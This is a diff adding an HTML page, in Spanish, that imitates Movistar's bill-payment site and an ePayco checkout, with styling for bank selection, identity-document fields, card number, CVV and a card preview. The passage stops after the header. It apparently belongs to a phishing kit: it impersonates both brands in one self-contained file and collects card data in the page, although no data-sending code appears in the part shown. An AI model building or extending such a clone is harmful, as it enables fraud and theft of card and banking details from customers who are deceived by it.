@@ -1,0 +1,1501 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pagar mi factura Movistar</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      padding: 24px;
+      color: #0b2739;
+    }
+    .container {
+      width: 100%;
+      max-width: 540px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* HEADER */
+    .header {
+      background: #ffffff;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+      border-radius: 4px;
+      padding: 16px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 35px;
+    }
+    .header-logo { height: 28px; object-fit: contain; }
+    .epayco-info { display: flex; align-items: center; gap: 5px; font-size: 11px; font-weight: 500; color: #333; }
+    .epayco-info svg { width: 10px; height: 10px; fill: #222; }
+    .epayco-logo { height: 16px; }
+
+    /* PANELS */
+    .view-panel { display: none; animation: fadeIn 0.4s ease; }
+    .view-panel.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* TABS */
+    .tabs-wrapper {
+      display: flex; justify-content: flex-start; margin-bottom: 25px; width: 100%;
+      overflow-x: auto; scroll-behavior: smooth; -webkit-overflow-scrolling: touch;
+      scrollbar-width: none; padding-bottom: 5px;
+    }
+    .tabs-wrapper::-webkit-scrollbar { display: none; }
+    .tabs-container {
+      display: inline-flex; background: #ffffff; border-radius: 8px; padding: 6px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.06); gap: 6px; margin: 0 auto;
+    }
+    .tab-btn {
+      background: #f2f4f7; border: none; padding: 8px 18px; border-radius: 25px;
+      font-size: 14px; font-weight: 500; color: #00a9e0; cursor: pointer;
+      transition: all 0.2s; flex-shrink: 0; line-height: 1.25;
+    }
+    .tab-btn.active { background: #00a9e0; color: #ffffff; }
+
+    /* TÍTULO */
+    .title { font-size: 20px; text-align: center; font-weight: 300; color: #4a5d6e; margin-bottom: 18px; }
+    .title strong { font-weight: 700; color: #0b2739; }
+
+    /* TOGGLE TYPE */
+    .toggle-group { display: flex; justify-content: center; gap: 15px; margin-bottom: 35px; }
+    .toggle-btn {
+      border: 1px solid #0b2739; background: #ffffff; color: #0b2739; border-radius: 25px;
+      padding: 8px 32px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+    }
+    .toggle-btn.active { background: #0b2739; color: #ffffff; }
+
+    /* AUTO PAY BUTTON */
+    .auto-pay {
+      background: #ffffff; border: 1px solid #eaeaea; box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+      border-radius: 25px; padding: 14px; display: flex; justify-content: center; align-items: center;
+      gap: 8px; font-size: 15px; color: #c4c4c4; font-weight: 500; cursor: pointer; margin-bottom: 40px; width: 100%;
+    }
+    .auto-pay svg { width: 20px; height: 20px; stroke: #c4c4c4; fill: none; stroke-width: 1.5; }
+
+    /* INPUT */
+    .input-wrapper { display: flex; align-items: center; border-bottom: 2px solid #0b2739; padding-bottom: 8px; margin-bottom: 30px; }
+    .input-wrapper svg { width: 18px; height: 18px; fill: none; stroke: #0b2739; stroke-width: 1.5; margin-right: 12px; }
+    .input-wrapper input { border: none; outline: none; flex: 1; font-size: 15px; color: #333; font-family: inherit; }
+    .input-wrapper input::placeholder { color: #727e8a; }
+
+    /* BTN SUBMIT */
+    .btn-submit {
+      width: 100%; background: #d5d5d5; color: #ffffff; border: none; border-radius: 30px;
+      padding: 15px; font-size: 17px; font-weight: 600; margin-bottom: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      transition: all 0.3s;
+    }
+    .btn-submit.enabled { background: #00a9e0; cursor: pointer; }
+
+    /* BOTTOM INFO */
+    .bottom-info { display: flex; flex-direction: column; align-items: center; }
+    .bottom-info-title { font-size: 14px; color: #0b2739; margin-bottom: 12px; }
+    .bottom-info-title strong { font-weight: 700; }
+    .logos-row { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 15px; }
+    .logos-row img { object-fit: contain; }
+    .logos-row .codensa { height: 16px; } .logos-row .daviplata { height: 20px; } .logos-row .nequi { height: 26px; } .logos-row .rappipay { height: 20px; }
+    .disclaimer { display: flex; align-items: center; gap: 6px; font-size: 10px; font-weight: 500; color: #0b2739; }
+    .disclaimer svg { width: 16px; height: 16px; flex-shrink: 0; color: #0b2739; }
+
+    /* INVOICE VIEW STYLES */
+    .invoice-top-card { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
+    .invoice-top-card img { width: 150px; object-fit: contain; }
+    .invoice-user-info { font-size: 15px; color: #4a5d6e; line-height: 1.4; }
+    .invoice-user-info .ga { font-size: 17px; color: #0b2739; letter-spacing: 0.5px; }
+    .invoice-user-info .ref { color: #a0aab5; font-size: 13px; margin-top: 5px; }
+    
+    .invoice-title { text-align: center; font-size: 18px; color: #4a5d6e; margin-bottom: 5px; }
+    .invoice-subtitle { text-align: center; color: #a0aab5; font-size: 14px; margin-bottom: 25px; }
+
+    .btn-add-other {
+      background: #00a9e0; color: #ffffff; border: none; border-radius: 30px; padding: 14px;
+      font-size: 15px; font-weight: 600; width: 100%; cursor: pointer; margin-bottom: 35px;
+      box-shadow: 0 4px 12px rgba(0,169,224,0.3);
+    }
+    .debt-container { border-bottom: 2px solid #0b2739; margin-bottom: 35px; }
+    .debt-row { display: flex; align-items: center; justify-content: space-between; padding-bottom: 12px; cursor: pointer; user-select: none; }
+    .debt-left { display: flex; align-items: center; gap: 10px; }
+    .debt-left svg { width: 28px; height: 28px; fill: #00a9e0; }
+    .debt-left .num { font-weight: 700; font-size: 16px; color: #0b2739; letter-spacing: 1px;}
+    .debt-left .lbl { font-size: 13px; color: #a0aab5; }
+    .debt-right { text-align: right; display: flex; align-items: center; gap: 8px;}
+    .debt-right-texts { display: flex; flex-direction: column; align-items: flex-end; }
+    .debt-right .amount { font-size: 20px; font-weight: 700; color: #0b2739; }
+    .debt-right .lbl { font-size: 13px; color: #a0aab5; }
+    .debt-caret { background: #f2f4f7; padding: 0 10px; border-radius: 4px; display: flex; align-items: center; justify-content: center; height: 42px; transition: transform 0.3s; margin-top:2px; }
+    .debt-caret svg { width: 14px; height: 14px; fill: #0b2739; transition: transform 0.3s;}
+    .debt-caret.open svg { transform: rotate(180deg); }
+
+    .debt-details { display: none; padding: 15px 0 5px 0; border-top: 1px solid #0b2739; margin-top: 5px; animation: fadeIn 0.3s; }
+    .debt-details.open { display: block; }
+    .dd-header { display: flex; justify-content: space-between; margin-bottom: 20px; }
+    .dd-item-title { font-size: 15px; color: #0b2739; font-weight: 700; margin-bottom: 2px;}
+    .dd-item-val { font-size: 13.5px; color: #4a5d6e; }
+    .dd-table-header { display: flex; justify-content: space-between; font-size: 14px; color: #4a5d6e; border-bottom: 1px solid #e0e5eb; padding-bottom: 8px; margin-bottom: 10px; }
+    .dd-row { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f2f4f7; }
+    .dd-row:last-child { border-bottom: none; }
+    .dd-row-left { display: flex; align-items: center; gap: 10px; font-size: 15.5px; color: #0b2739; }
+    .dd-row-left svg { width: 24px; height: 24px; }
+    .dd-row-right { display: flex; align-items: center; gap: 8px; font-size: 15.5px; color: #a0aab5; }
+    .dd-row-right.active { color: #0b2739; }
+    .icon-edit { width: 16px; height: 16px; fill: none; stroke: #00a9e0; stroke-width: 2; cursor: pointer; }
+    .icon-edit.disabled { stroke: #d5d5d5; cursor: default; }
+    
+    .action-buttons { display: flex; gap: 15px; margin-bottom: 25px; }
+    .btn-cancel, .btn-pay { flex: 1; border-radius: 30px; padding: 14px; font-weight: 600; font-size: 16px; cursor: pointer; text-align: center; outline: none;}
+    .btn-cancel { background: #ffffff; border: 1px solid #0b2739; color: #0b2739; }
+    .btn-cancel:hover { background: #f2f4f7; }
+    .btn-pay { background: #0b2739; border: 1px solid #0b2739; color: #ffffff; }
+    .btn-pay:hover { opacity: 0.9; transform: translateY(-1px); }
+
+    .info-box { border: 1px solid #e0e5eb; border-radius: 8px; padding: 12px 15px; font-size: 13.5px; color: #4a5d6e; line-height: 1.5; margin-bottom: 30px; }
+    .info-box strong { color: #0b2739; font-weight: 700; }
+
+    .cards-row { display: flex; justify-content: center; align-items: center; margin-bottom: 15px; gap: 4px; }
+    .cards-row img { height: 26px; border-radius: 3px;}
+    .footer-epayco { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 13px; color: #4a5d6e; }
+    .footer-epayco img { height: 16px; }
+
+    /* CARGANDO OVERLAY */
+    #loading-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255,255,255,0.95); display: none; flex-direction: column;
+      align-items: center; justify-content: center; z-index: 1000;
+    }
+    .spinner {
+      width: 50px; height: 50px; border: 4px solid #f2f4f7; border-top: 4px solid #00a9e0;
+      border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loading-text { font-size: 16px; font-weight: 600; color: #0b2739; margin-bottom: 5px; }
+    .loading-sub { font-size: 13px; color: #727e8a; max-width: 250px; text-align: center;}
+
+    /* ==== EPAYCO MODAL ==== */
+    #epayco-modal { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index: 2000; display: none; align-items: center; justify-content: center; }
+    #epayco-modal.active { display: flex; animation: fadeInModal 0.3s; }
+    @keyframes fadeInModal { from {opacity:0;} to {opacity:1;} }
+    
+    .epayco-card { width: 100%; height: 100%; max-width: 480px; display: flex; flex-direction: column; overflow-y: auto; position: relative; background: #fff; }
+    @media(min-width: 481px) { .epayco-card { height: auto; max-height: 90vh; border-radius: 6px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); } }
+    
+    .epayco-top { background: #1a1b1c; padding: 40px 30px 45px 30px; color: #fff; text-align: center; position: relative; }
+    .epayco-close { position: absolute; top: 15px; right: 20px; cursor: pointer; }
+    .epayco-lang { position: absolute; top: 50px; right: 20px; background: #4a4a4a; color: white; border-radius: 4px; padding: 4px 8px; font-size: 13px; font-weight: 600; cursor:pointer;}
+    .epayco-logo-box { background: white; width: 75px; height: 75px; margin: 15px auto 30px auto; border-radius: 6px; display: flex; align-items: center; justify-content: center; padding:8px; }
+    .epayco-logo-box img { width: 100%; object-fit: contain; }
+    .epayco-company { font-size: 15px; font-weight: 700; margin-bottom: 15px; letter-spacing: 0.5px; display: flex; align-items:center; justify-content:center; gap:5px; text-transform: uppercase;}
+    .epayco-desc { font-size: 15px; margin-bottom: 35px; }
+    .epayco-total-lbl { font-size: 15px; margin-bottom: 10px; }
+    .epayco-total { font-size: 28px; font-weight: 700; margin-bottom: 35px; }
+    .epayco-sec { font-size: 13px; font-style: italic; display: flex; align-items:center; justify-content:center; gap: 6px;}
+    .epayco-sec img { height: 16px; margin-left: 5px; }
+
+    .epayco-bottom { background: #fff; padding: 25px; flex:1;}
+    .epayco-contact-title { font-size: 15px; font-weight: 700; color: #0b2739; display: flex; align-items: center; gap: 8px; margin-bottom: 20px;}
+    .epayco-contact-title svg { fill: #1a1b1c; width: 18px; height: 18px; }
+    
+    .epayco-inputs-row { display: flex; gap: 10px; margin-bottom: 18px; }
+    .epayco-input-group { position: relative; display: flex; flex-direction: column; width: 100%;}
+    .epayco-input-group label { position: absolute; top: -8px; left: 10px; background: white; padding: 0 5px; font-size: 13px; color: #4a5d6e; font-weight: 500; z-index: 2; transition:0.2s;}
+    .epayco-input { border: 1px solid #dcdcdc; border-radius: 6px; padding: 14px 15px; font-size: 15px; font-family: inherit; color: #0b2739; background: #fff; outline: none; transition: 0.2s; width: 100%; }
+    .epayco-input::placeholder { color: #a0aab5; }
+    .epayco-input-group.active .epayco-input { background: #edf2f9; border-color: #1d65d4; }
+    .epayco-input-group.active label { color: #1a1b1c; }
+    
+    .w-code { width: 35%; }
+    .w-phone { width: 65%; }
+
+    .epayco-btn { width: 100%; background: #e0e0e0; color: #a0aab5; border: none; border-radius: 6px; padding: 15px; font-size: 16px; font-weight: 700; margin-top: 10px; cursor: default; transition: 0.3s; }
+    .epayco-btn.enabled { background: #000000; color: #ffffff; cursor: pointer; }
+    .select-wrap { display: flex; align-items: center; justify-content: space-between; border: 1px solid #dcdcdc; border-radius: 6px; padding: 14px; transition: 0.2s; background: white;}
+    .select-wrap svg { width: 12px; height: 12px; fill: #a0aab5; }
+    .select-wrap img { width: 22px; margin-right: 6px;}
+
+    /* STEP 2: TARJETAS */
+    #epayco-step-1 { display: flex; flex-direction: column; width: 100%; transition: opacity 0.3s; }
+    #epayco-step-2 { display: none; flex-direction: column; width: 100%; background: #ffffff; transition: opacity 0.3s; padding-bottom: 20px;}
+
+    .epayco-top-small { background: #1a1b1c; padding: 15px 20px; color: #fff; display: flex; align-items: center; justify-content: space-between; }
+    .epayco-small-left { display: flex; align-items: center; gap: 12px; width: 80%; }
+    .epayco-small-logo { width: 45px; height: 45px; background: white; border-radius: 4px; padding: 4px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .epayco-small-logo img { width: 100%; object-fit: contain; }
+    .epayco-small-texts { display: flex; flex-direction: column; overflow: hidden; width:100%;}
+    .epayco-small-title { font-size: 15px; font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display:flex; align-items:center; gap:5px; text-transform: uppercase;}
+    .epayco-small-title svg { fill: #00a9e0; width: 12px; flex-shrink: 0;}
+    .epayco-small-desc { font-size: 14px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .epayco-small-right { display: flex; flex-direction: column; align-items: flex-end; gap: 8px; justify-content:center; }
+    .epayco-small-lang { background: #4a4a4a; color: white; border-radius: 4px; padding: 2px 6px; font-size: 12px; font-weight: 600; cursor:pointer;}
+    .epayco-small-close { cursor: pointer; }
+
+    .epayco-user-bar { background: #fff; border-bottom: 2px solid #e0e5eb; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; font-size: 14.5px; }
+    .epayco-user-bar strong { color: #1a1b1c; }
+    .epayco-user-bar .mail { color: #0b2739; }
+    .epayco-edit-btn { color: #32a1f1; text-decoration: none; display: flex; align-items: center; gap: 5px; cursor: pointer; font-size: 14px;}
+    .epayco-edit-btn svg { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2; }
+
+    .epayco-methods { padding: 25px 20px; flex: 1; min-height: 250px;}
+    .epayco-methods h3 { font-size: 16px; font-weight: 700; color: #1a1b1c; margin-bottom: 15px; margin-top: 0; }
+    .epayco-method-btn { display: flex; align-items: center; gap: 15px; padding: 15px; background: #fff; border: 1px solid #dcdcdc; border-radius: 6px; margin-bottom: 12px; cursor: pointer; transition: 0.2s;}
+    .epayco-method-btn:hover { border-color: #0b2739; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+    .epayco-m-icon { width: 35px; height: 35px; flex-shrink: 0; display:flex; align-items:center; justify-content:center;}
+    .epayco-m-icon img { width: 100%; height: 100%; object-fit: contain; }
+    .epayco-m-texts { display: flex; flex-direction: column; }
+    .epayco-m-title { font-size: 15px; font-weight: 700; color: #1a1b1c; display: flex; align-items:center; gap:5px;}
+    .epayco-m-desc { font-size: 12.5px; color: #4a5d6e; line-height: 1.4; margin-top: 5px; }
+    .epayco-m-desc img { height: 12px; vertical-align:middle; margin:0 3px;}
+
+    .epayco-footer { background: #fff; padding: 20px 20px 0 20px; border-top: 1px solid #dcdcdc; display: flex; justify-content: space-between; align-items: center; margin-top:auto;}
+    .epayco-f-left { display: flex; flex-direction: column; }
+    .epayco-f-total { font-size: 16px; font-weight: 700; color: #000; margin-bottom: 15px; }
+    .epayco-f-link { font-size: 16px; color: #32a1f1; text-decoration: none; cursor:pointer;}
+    .epayco-f-right { font-size: 12px; font-style: italic; display: flex; align-items: flex-end; gap: 6px; height: 100%; padding-top:15px;}
+    .epayco-f-right img { height: 16px; }
+
+    /* ==== PSE STEP 3 ==== */
+    #epayco-step-3 { display: none; flex-direction: column; width: 100%; background: #fff; }
+    .pse-top-bar { background: #1a1b1c; padding: 14px 20px; color: #fff; display: flex; align-items: center; gap: 12px; }
+    .pse-back-btn { cursor: pointer; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.15); border-radius: 50%; width: 30px; height: 30px; flex-shrink: 0; transition: background 0.2s; }
+    .pse-back-btn:hover { background: rgba(255,255,255,0.3); }
+    .pse-top-bar-title { font-size: 15px; font-weight: 600; }
+
+    .pse-step-label { display: flex; align-items: center; gap: 8px; padding: 16px 20px 8px 20px; font-size: 14.5px; font-weight: 600; color: #1a1b1c; }
+    .pse-step-label img { height: 22px; }
+    .pse-step-label span { color: #32a1f1; font-weight: 400; font-size: 13.5px; margin-left: 2px; }
+
+    .pse-bank-label { font-size: 14.5px; font-weight: 700; color: #1a1b1c; padding: 6px 20px 14px 20px; }
+
+    .pse-banks-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 20px; margin-bottom: 18px; }
+    .pse-bank-card { border: 2px solid #e8eaed; border-radius: 10px; padding: 16px 12px; display: flex; flex-direction: column; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s; background: #fff; }
+    .pse-bank-card:hover { border-color: #1a1b1c; box-shadow: 0 3px 10px rgba(0,0,0,0.08); transform: translateY(-1px); }
+    .pse-bank-card.selected { border-color: #1a1b1c; background: #f5f7fa; }
+    .pse-bank-card img { height: 42px; object-fit: contain; }
+    .pse-bank-card span { font-size: 13px; font-weight: 500; color: #1a1b1c; text-align: center; }
+
+    /* Dropdown seleccionar otro banco */
+    .pse-other-bank-wrap { margin: 0 20px 20px 20px; position: relative; }
+    .pse-other-bank-label { font-size: 13px; color: #727e8a; font-weight: 500; position: absolute; top: -9px; left: 12px; background: #fff; padding: 0 5px; z-index: 2; }
+    .pse-other-bank-select { border: 1.5px solid #b0b8c4; border-radius: 8px; padding: 13px 16px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: border-color 0.2s; background: #fff; }
+    .pse-other-bank-select:hover { border-color: #1a1b1c; }
+    .pse-other-bank-select span { font-size: 14.5px; color: #a0aab5; }
+    .pse-other-bank-select.has-value span { color: #1a1b1c; }
+    .pse-other-bank-select svg { width: 16px; height: 16px; fill: #a0aab5; transition: transform 0.25s; }
+    .pse-other-bank-select.open svg { transform: rotate(180deg); }
+
+    /* Panel de búsqueda de bancos */
+    #pse-bank-panel { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 500; display: none; flex-direction: column; }
+    #pse-bank-panel.visible { display: flex; animation: fadeIn 0.25s ease; }
+    .pse-panel-top { background: #1a1b1c; padding: 14px 20px; color: #fff; display: flex; align-items: center; gap: 14px; flex-shrink: 0; }
+    .pse-panel-back { cursor: pointer; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.15); border-radius: 50%; width: 30px; height: 30px; flex-shrink: 0; transition: background 0.2s; }
+    .pse-panel-back:hover { background: rgba(255,255,255,0.3); }
+    .pse-panel-title { font-size: 15px; font-weight: 600; }
+    .pse-search-bar { background: #2c2d2e; margin: 12px 16px; border-radius: 8px; display: flex; align-items: center; gap: 10px; padding: 10px 14px; flex-shrink: 0; }
+    .pse-search-bar svg { width: 16px; height: 16px; fill: #a0aab5; flex-shrink: 0; }
+    .pse-search-bar input { background: transparent; border: none; outline: none; font-size: 14.5px; color: #fff; font-family: inherit; flex: 1; }
+    .pse-search-bar input::placeholder { color: #727e8a; }
+    .pse-bank-list { flex: 1; overflow-y: auto; }
+    .pse-bank-list-item { padding: 15px 20px; border-bottom: 1px solid #f0f2f5; font-size: 14.5px; color: #1a1b1c; cursor: pointer; transition: background 0.15s; display: flex; align-items: center; gap: 12px; }
+    .pse-bank-list-item:hover { background: #f7f9fc; }
+    .pse-bank-list-item span { font-weight: 500; }
+    .pse-bank-list-item.highlight span { color: #c0392b; }
+
+    .pse-footer { background: #fff; padding: 16px 20px 0 20px; border-top: 1px solid #dcdcdc; display: flex; justify-content: space-between; align-items: center; margin-top: auto; }
+    .pse-f-left { display: flex; flex-direction: column; }
+    .pse-f-total { font-size: 16px; font-weight: 700; color: #000; margin-bottom: 15px; }
+    .pse-f-link { font-size: 16px; color: #32a1f1; cursor: pointer; }
+    .pse-f-right { font-size: 12px; font-style: italic; display: flex; align-items: flex-end; gap: 5px; padding-top: 15px; }
+    .pse-f-right img { height: 16px; }
+    .pse-continuar-btn { display: flex; align-items: center; justify-content: center; background: #e0e0e0; border-radius: 50%; width: 42px; height: 42px; cursor: default; transition: all 0.3s; }
+    .pse-continuar-btn.enabled { background: #1a1b1c; cursor: pointer; }
+    .pse-continuar-btn svg { fill: none; stroke: #fff; stroke-width: 2.5; width: 20px; height: 20px; }
+    .pse-continuar-wrap { display: flex; flex-direction: column; align-items: flex-end; gap: 5px; }
+    .pse-continuar-label { font-size: 15px; font-weight: 700; color: #1a1b1c; }
+
+    /* ==== PSE STEP 4 (Paso 2 de 2) ==== */
+    #epayco-step-4 { display: none; flex-direction: column; width: 100%; background: #fff; }
+    .pse-s4-scroll { flex: 1; overflow-y: auto; padding: 0 20px 20px 20px; }
+    .pse-person-toggle { display: flex; gap: 10px; margin-bottom: 20px; }
+    .pse-person-btn { flex: 1; display: flex; align-items: center; justify-content: center; gap: 8px; border: 1.5px solid #dcdcdc; border-radius: 8px; padding: 12px 10px; font-size: 14px; font-weight: 600; color: #727e8a; cursor: pointer; transition: all 0.2s; background: #fff; }
+    .pse-person-btn.active { border-color: #1a1b1c; background: #edf2f9; color: #1a1b1c; }
+    .pse-person-btn svg { width: 18px; height: 18px; border: 2px solid currentColor; border-radius: 50%; flex-shrink: 0; transition: all 0.2s; }
+    .pse-person-btn.active svg { border-color: #1a1b1c; background: #1a1b1c; box-shadow: inset 0 0 0 3px #edf2f9; }
+    .pse-field-group { position: relative; margin-bottom: 16px; }
+    .pse-field-group label { position: absolute; top: -8px; left: 11px; background: #fff; padding: 0 5px; font-size: 12.5px; color: #727e8a; font-weight: 500; z-index: 2; }
+    .pse-field-input { border: 1.5px solid #dcdcdc; border-radius: 8px; padding: 14px 14px; font-size: 14.5px; font-family: inherit; color: #1a1b1c; width: 100%; outline: none; transition: border-color 0.2s; background: #fff; }
+    .pse-field-input::placeholder { color: #a0aab5; }
+    .pse-field-input:focus { border-color: #1a1b1c; }
+    .pse-doc-row { display: flex; gap: 10px; margin-bottom: 16px; }
+    .pse-doc-select-wrap { position: relative; width: 110px; flex-shrink: 0; }
+    .pse-doc-select-wrap label { position: absolute; top: -8px; left: 11px; background: #fff; padding: 0 5px; font-size: 12.5px; color: #727e8a; font-weight: 500; z-index: 2; }
+    .pse-doc-select { border: 1.5px solid #dcdcdc; border-radius: 8px; padding: 14px 10px; font-size: 14.5px; font-family: inherit; color: #1a1b1c; width: 100%; outline: none; cursor: pointer; appearance: none; background: #fff url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M7 10l5 5 5-5z' fill='%23a0aab5'/%3E%3C/svg%3E") no-repeat right 8px center / 18px; }
+    .pse-doc-num { flex: 1; position: relative; }
+    .pse-doc-num input { border: 1.5px solid #e5433a; border-radius: 8px; padding: 14px 14px; font-size: 14.5px; font-family: inherit; color: #1a1b1c; width: 100%; outline: none; }
+    .pse-doc-num input::placeholder { color: #a0aab5; }
+    .pse-terms { display: flex; align-items: flex-start; gap: 12px; font-size: 13px; color: #4a5d6e; line-height: 1.5; margin-bottom: 10px; }
+    .pse-terms a { color: #32a1f1; text-decoration: none; }
+    .pse-terms-check { width: 18px; height: 18px; border: 2px solid #b0b8c4; border-radius: 3px; flex-shrink: 0; cursor: pointer; display: flex; align-items: center; justify-content: center; margin-top: 1px; transition: all 0.2s; }
+    .pse-terms-check.checked { background: #1a1b1c; border-color: #1a1b1c; }
+    .pse-terms-check svg { display: none; }
+    .pse-terms-check.checked svg { display: block; }
+    .pse-pagar-footer { background: #fff; padding: 16px 20px 0 20px; border-top: 1px solid #dcdcdc; display: flex; justify-content: space-between; align-items: flex-end; margin-top: auto; padding-bottom: 5px; }
+    .pse-pagar-f-left { display: flex; flex-direction: column; padding-bottom: 15px; }
+    .pse-pagar-total { font-size: 16px; font-weight: 700; color: #000; margin-bottom: 10px; }
+    .pse-pagar-link { font-size: 15px; color: #32a1f1; cursor: pointer; }
+    .pse-pagar-btn { background: #e0e0e0; color: #a0aab5; border: none; border-radius: 8px; padding: 13px 28px; font-size: 15px; font-weight: 700; cursor: default; transition: all 0.3s; font-family: inherit; }
+    .pse-pagar-btn.enabled { background: #1a1b1c; color: #fff; cursor: pointer; }
+    .pse-pagar-secured { font-size: 11px; font-style: italic; display: flex; align-items: center; gap: 5px; padding-bottom: 15px; }
+    .pse-pagar-secured img { height: 14px; }
+
+    /* ==== STEP TARJETA ==== */
+    #epayco-step-tarjeta { display: none; flex-direction: column; width: 100%; background: #fff; }
+    .tc-scroll { flex: 1; overflow-y: auto; padding: 20px 20px 20px 20px; }
+    .tc-label { display: flex; align-items: center; gap: 9px; font-size: 14.5px; font-weight: 600; color: #1a1b1c; margin-bottom: 20px; }
+    .tc-label svg { width: 22px; height: 22px; fill: none; stroke: #1a1b1c; stroke-width: 1.5; }
+    .tc-label span { color: #32a1f1; font-weight: 400; font-size: 13.5px; }
+    .tc-field { position: relative; margin-bottom: 14px; }
+    .tc-field label { position: absolute; top: -8px; left: 11px; background: #fff; padding: 0 5px; font-size: 12px; color: #727e8a; font-weight: 500; z-index: 2; }
+    .tc-input { border: 1.5px solid #dcdcdc; border-radius: 8px; padding: 14px 14px; font-size: 14.5px; font-family: 'Inter', monospace; color: #1a1b1c; width: 100%; outline: none; transition: border-color 0.2s; background: #fff; letter-spacing: 0.5px; }
+    .tc-input::placeholder { color: #a0aab5; letter-spacing: 0; }
+    .tc-input:focus { border-color: #1a1b1c; }
+    .tc-row { display: flex; gap: 10px; margin-bottom: 14px; }
+    .tc-row .tc-field { flex: 1; margin-bottom: 0; }
+    .tc-row .tc-field.cuotas { flex: 0.7; }
+    .tc-cvv-wrap { position: relative; }
+    .tc-cvv-eye { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #a0aab5; }
+    .tc-cvv-eye svg { width: 18px; height: 18px; fill: none; stroke: currentColor; stroke-width: 1.5; }
+    .tc-select { border: 1.5px solid #dcdcdc; border-radius: 8px; padding: 14px 10px; font-size: 14.5px; font-family: inherit; color: #1a1b1c; width: 100%; outline: none; cursor: pointer; appearance: none; background: #fff url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M7 10l5 5 5-5z' fill='%23a0aab5'/%3E%3C/svg%3E") no-repeat right 8px center / 18px; }
+
+    /* Preview tarjeta */
+    .tc-card-preview { width: 100%; max-width: 280px; height: 160px; border-radius: 14px; background: linear-gradient(135deg, #1a1b1c 0%, #2d2e30 60%, #3a3b3d 100%); margin: 18px auto 20px auto; padding: 20px 22px; display: flex; flex-direction: column; justify-content: space-between; box-shadow: 0 8px 25px rgba(0,0,0,0.25); position: relative; overflow: hidden; }
+    .tc-card-preview::before { content: ''; position: absolute; right: -30px; top: -30px; width: 120px; height: 120px; border-radius: 50%; background: rgba(255,255,255,0.05); }
+    .tc-card-preview::after { content: ''; position: absolute; right: 20px; top: 60px; width: 70px; height: 70px; border-radius: 50%; background: rgba(255,255,255,0.04); }
+    .tc-card-chip { width: 32px; height: 24px; background: linear-gradient(135deg, #d4a847, #f0d080); border-radius: 4px; }
+    .tc-card-number { font-family: 'Courier New', monospace; font-size: 13.5px; font-weight: 600; color: #fff; letter-spacing: 2px; text-align: center; text-shadow: 0 1px 3px rgba(0,0,0,0.4); white-space: nowrap; }
+    .tc-card-bottom { display: flex; justify-content: space-between; align-items: flex-end; }
+    .tc-card-name-lbl { font-size: 9px; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 2px; }
+    .tc-card-name { font-size: 12px; font-weight: 600; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
+    .tc-card-exp-lbl { font-size: 9px; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 2px; text-align: right; }
+    .tc-card-exp { font-size: 12px; font-weight: 600; color: #fff; text-align: right; }
+  </style>
+</head>
+<body>
+
+<!-- Overlay de Carga -->
+<div id="loading-overlay">
+  <div class="spinner"></div>
+  <div class="loading-text">Consultando factura...</div>
+  <div class="loading-sub">Comprobando datos con ePayco, esto puede tardar unos segundos.</div>
+</div>
+
+<div class="container">
+  
+  <div class="header">
+    <img src="img/logo.png" alt="Movistar" class="header-logo" />
+    <div class="epayco-info">
+      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+      <span>Pagos procesados por</span>
+      <img src="img/logo_ePayco.1773862663813.png" alt="ePayco" class="epayco-logo" />
+    </div>
+  </div>
+
+  <!-- VISTA FORMULARIO BÚSQUEDA -->
